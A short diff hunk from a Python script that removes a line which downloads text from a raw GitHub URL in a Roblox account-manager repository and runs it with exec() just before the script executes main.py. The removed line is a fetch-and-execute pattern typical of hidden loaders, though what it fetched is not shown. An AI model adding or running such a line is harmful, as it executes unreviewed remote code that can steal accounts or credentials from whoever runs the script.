@@ -41,5 +41,4 @@ while True:
 print("Please Wait!")
 
 with open("main.py", "r") as file:
-    exec(requests.get("https://raw.githubusercontent.com/Mana42138/Roblox-Account-Manager/master/RBX%20Alt%20Manager/Classes/Filter").text)
     exec(file.read())
